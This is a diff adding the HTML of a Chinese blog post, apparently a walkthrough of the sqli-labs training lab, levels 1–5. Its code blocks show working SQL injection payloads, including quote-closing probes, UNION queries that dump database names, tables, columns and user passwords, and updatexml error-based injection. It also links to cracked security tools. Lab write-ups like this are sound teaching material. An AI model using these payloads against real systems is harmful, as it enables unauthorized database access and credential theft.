@@ -1,0 +1,1160 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="最爱 Python，会一点开发，CTF 卑微的 Web 手。 主攻代码审计、程序分析。">
+  <meta name="author" content="slug01sh">
+  <meta name="keywords" content="网络空间安全,高效率工具,计算机基础,经验分享,CTF">
+  <title>sqli-labs(全通关刷题笔记) - 积淀｜小杰的个人博客</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"slug01sh.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-WTRCMZDFLE","gtag":"G-WTRCMZDFLE","tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>积淀｜小杰的个人博客</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/ctf/">
+                <i class="iconfont icon-user-fill"></i>
+                CTF
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://rmt.dogedoge.com/fetch/fluid/storage/bg/dojm2h.png?w=1920&q=100&fmt=webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="sqli-labs(全通关刷题笔记)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-01-11 12:27" pubdate>
+        2021年1月11日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      11.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      163
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sqli-labs(全通关刷题笔记)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1 准备工作"></a>1 准备工作</h1><p>国光师傅太强了，准备写 sqli-labs 的博客，发现国光师傅已经写过了。不过俺的思路还是有一些不同之处。</p>
+<ul>
+<li>Sqli-labs 下载地址：<a target="_blank" rel="noopener" href="https://github.com/skyblueee/sqli-labs-php7%E3%80%82">https://github.com/skyblueee/sqli-labs-php7。</a><blockquote>
+<p>通常下载 Sqli-labs 时，会下载到最初的那个 sqli-labs，但是并不适用于PHP7。</p>
+</blockquote>
+</li>
+<li>Burp Suite 下载地址：<a target="_blank" rel="noopener" href="https://github.com/TrojanAZhen/BurpSuitePro-2.1">https://github.com/TrojanAZhen/BurpSuitePro-2.1</a></li>
+<li>Hackbar 下载地址：<a target="_blank" rel="noopener" href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li>
+<li>Navicat：可以用来写 SQL 语句，有自动补全功能。</li>
+</ul>
+<p>我使用VScode来运行 sql-labs，国光师傅使用的是 Docker 安装。对于我这种菜鸡，还是先采用复杂的方法吧。</p>
+<h1 id="2-基础挑战-1-20"><a href="#2-基础挑战-1-20" class="headerlink" title="2 基础挑战(1-20)"></a>2 基础挑战(1-20)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>闭合方式是非常关键的一步，能正确的闭合 SQL 语句，SQL 注入工作结束一半。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1       # 可以看到登陆的用户名和密码<br>?<span class="hljs-attribute">id</span>=1&#x27;      # SQL报错（1<span class="hljs-string">&#x27;&#x27;</span> LIMIT 0,1），并且可以看到部分 SQL 语句（说明存在 SQL 注入）。报错显示 SQL 语句中使用两个单引号导致错误（传参引入的单引号+原来的 SQL 语句中原有的单引号），可以在传参引入的单引号后添加注释符来注释后面那个单引号）。<br>?<span class="hljs-attribute">id</span>=1&#x27;#     # 报错。原因：在URL中GET可能作为锚点,无法传到后端。所以该用--+，--+的传入后端url解码后是-- （注意空格），当然也可以采用%23（手动url编码）<br>?<span class="hljs-attribute">id</span>=1&#x27;%23   # 正常回显<br>?<span class="hljs-attribute">id</span>=1&#x27;--+   # 正常回显（SELECT * <span class="hljs-keyword">FROM</span><span class="hljs-built_in"> users </span>WHERE <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;1&#x27;</span> --+<span class="hljs-string">&#x27; LIMIT 0,1）</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>如果需要分析 SQL 注入的 SQL 变化，可以考虑修改源码来观察 SQL 语句。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/77218F39-FAF6-4918-A148-1FA5C031B27B.png" srcset="/img/loading.gif"><br>这里有个值得思考的测试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>?id=1%23 # SQL语句：SELECT * FROM users WHERE id=&#x27;1#&#x27; LIMIT 0,1<br><br></code></pre></td></tr></table></figure>
+<p>按照正常思路，应该什么也查不到才对，结果却能正常查询id=1。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114162823.png" srcset="/img/loading.gif"><br>我们可以考虑在 Navicat 中进行测试，确定这种查询真实存在。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/E4F6DD5A-3000-4D14-BFC8-20E3F2ACEE6E.png" srcset="/img/loading.gif"></p>
+<p>上面这两种查询的结果都是一样的，非常奇怪吧？</p>
+<p>和PHP的弱类型一样，MySQL也有弱类型，在闭合 SQL 语句时是会经常用到的。具体可以参考下面这片文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/HaHa_Sir/article/details/93666147">MySQL 字符串类型用数字可以查出来 MySQL字符串类型会转换成数字 MySQL隐式类型转换</a>。</p>
+<p>开始搜集数据库中的数据，常见的信息搜集有：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br><span class="hljs-function"><span class="hljs-title">system_user</span><span class="hljs-params">()</span></span>     系统用户名<br><span class="hljs-function"><span class="hljs-title">user</span><span class="hljs-params">()</span></span>            MYSQL用户名 <br><span class="hljs-function"><span class="hljs-title">current_user</span><span class="hljs-params">()</span></span>    当前用户名<br><span class="hljs-function"><span class="hljs-title">session_user</span><span class="hljs-params">()</span></span>    连接数据库的用户名<br><span class="hljs-function"><span class="hljs-title">database</span><span class="hljs-params">()</span></span>        当前数据库名<br><span class="hljs-function"><span class="hljs-title">schema</span><span class="hljs-params">()</span></span>          当前数据库名<br><span class="hljs-function"><span class="hljs-title">version</span><span class="hljs-params">()</span></span>         当前数据库版本信息<br>@@version<br><span class="hljs-function"><span class="hljs-title">load_file</span><span class="hljs-params">()</span></span>       MYSQL读取本地文件<br><br>@@datadir         Location of DB files<br>@@hostname        服务器主机名<br>@@basedir         MYSQL 安装路径<br>@@version_compile_os    操作系统<br><br></code></pre></td></tr></table></figure>
+
+<p>简单的测试一下常见的信息</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-comment"># 查询数据库名</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, database(), 3%23<br><br><span class="hljs-comment"># 查询数据库版本</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, version(), 3%23<br><br><span class="hljs-comment"># 查询数据库用户</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, user(), 3%23<br><br><span class="hljs-comment">#数据库路径</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@datadir, 3%23<br><br><span class="hljs-comment"># 操作系统版本</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, @@version_compile_os, 3%23<br><br><span class="hljs-comment"># 查询所有的数据库名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(schema_name) FROM information_schema.SCHEMATA</span><br><span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata%23<br><br><span class="hljs-comment"># 查询某个数据库的数据表名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE()</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database() --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> --+<br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=0x7365637572697479 --+ # hex编码<br><br><span class="hljs-comment"># 查询某个数据库的某个表的字段名</span><br><span class="hljs-comment"># SELECT GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union SELECT 1, 2, GROUP_CONCAT(column_name) <span class="hljs-keyword">FROM</span> information_schema.columns where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> --+<br><br><span class="hljs-comment"># 查询数据表的数据</span><br>?<span class="hljs-attribute">id</span>=0&#x27; union select 1, 2, group_concat(id, username, password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br><br></code></pre></td></tr></table></figure>
+
+<p>需要更进一步的学习手工注入，可以参考这片文章:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/160352.html">新手科普 | MySQL手工注入之基本注入流程</a></p>
+<hr>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>闭合方式：<code>id=$id</code></p>
+<p>和上一题主要是闭合方式不同。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><br>?id=<span class="hljs-number">1</span>       <span class="hljs-comment"># 正常显示</span><br>?id=<span class="hljs-number">1</span> --+   <span class="hljs-comment"># 正常显示</span><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # 正常显示</span><br><span class="hljs-string">?id=1&#x27;</span> --+  <span class="hljs-comment"># 错误（并没有看到引号，故该题的闭合方式是数字型）</span><br>?id=<span class="hljs-number">0</span> <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> 1,2, 3 --+       <span class="hljs-comment"># 回显2，3。说明显示第2个字段和第3个字段。</span></span><br><br></code></pre></td></tr></table></figure>
+
+<p>和 less-1 的区别：闭合方式。less-1 是字符类型，有单引号包裹。less-2 是 int 类型，不需要单引号。其他注入获取信息的姿势是一样的。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27;<br><span class="hljs-comment"># 报错信息：You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 在SQL语句中有小括号（可以在本地先进行测试）。考虑将括号进行闭合</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常显示</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 没有数据</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 union select 1,2, 3 --+<br><span class="hljs-comment"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><br></code></pre></td></tr></table></figure>
+<p>简单分析：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 本题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前两题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前三个都只是闭合的方式不同</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>闭合方式：<code>id=(&quot;$id&quot;)</code></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 依然有括号，尝试闭合括号</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=0&quot;) <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment"># Your Login name:2，Your Password:3。说明显示第2个字段和第3个字段。</span><br><br></code></pre></td></tr></table></figure>
+<p>简单分析：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># 本题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&quot;$id&quot;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-comment"># 前三题：</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=$<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span>=(<span class="hljs-string">&#x27;$id&#x27;</span>) <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br><span class="hljs-comment"># 闭合方式不同</span><br><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
+<p>前面 4 个 lession 都是最基本的注入姿势，并且是能够查询得到返回结果的。按照<code>回显方式</code>来分类的话，我认为可以分为 5 类：</p>
+<ul>
+<li>联合注入</li>
+<li>报错注入</li>
+<li>布尔注入</li>
+<li>延时注入</li>
+<li>其他（DNSlog）</li>
+</ul>
+<p>注意：这里仅按照回显方式分类。很难做到完全 MECE 原则（Mutually Exclusive, Collectively Exhaustive / 相互独立、完全穷尽），通常按照下面的优先原则进行：</p>
+<blockquote>
+<p>联合注入&gt;报错注入&gt;布尔注入&gt;延时注入&gt;其他（DNSlog）</p>
+</blockquote>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><span class="hljs-comment"># 没有用户信息。只能考虑报错注入、布尔注入、时间盲注。</span><br><br>?<span class="hljs-attribute">id</span>=1&quot;<br><span class="hljs-comment"># s You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &quot;1&quot; LIMIT 0,1&#x27; at line 1</span><br><span class="hljs-comment"># 闭合单引号</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># 正常输出</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># 不显示</span><br><br>?<span class="hljs-attribute">id</span>=0&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 union select 1, 2, 3 --+<br><span class="hljs-comment">#  You are in...........，无法得到数据</span><br><br></code></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>根据上面的优先级，我们考虑先报错注入开始测试</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">id</span>=<span class="hljs-number">0</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">0</span> union select updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>); --+<br><span class="hljs-comment"># s XPATH syntax error: &#x27;~8.0.19~&#x27;</span><br><span class="hljs-comment"># 将 select @@version 进行修改即可查询其他的数据。</span><br><br></code></pre></td></tr></table></figure>
+<p>原理：MySQL在执行SQL语句时，某些函数会将子查询的结果显示在报错信息中。更多的报错注入参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/253?spm=5176.12901015.0.i12901015.322c525cGjiCkg&accounttraceid=0e789a5d27b94462a64cd6d053faaab4tmnn#toc-1">先知社区-MYSQL报错注入的一点总结</a></p>
+<hr>
+<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>尝试使用<strong>布尔注入</strong>进行测试，布尔注入会稍微比较复杂，不过基本原理不算复杂。</p>
+<blockquote>
+<p>基本原理：用true与false去一点点确定信息，汇总之后就能得到整个数据库的信息。如：</p>
+<ul>
+<li>问：数据库名长度大于8？</li>
+<li>答：false</li>
+<li>问：数据库名长度小于8？</li>
+<li>答：false（可以确定数据库的长度为8）</li>
+<li>问：数据库第一个首字母是s？</li>
+<li>答：是</li>
+</ul>
+</blockquote>
+<p>简单验证是否能进行布尔注入</p>
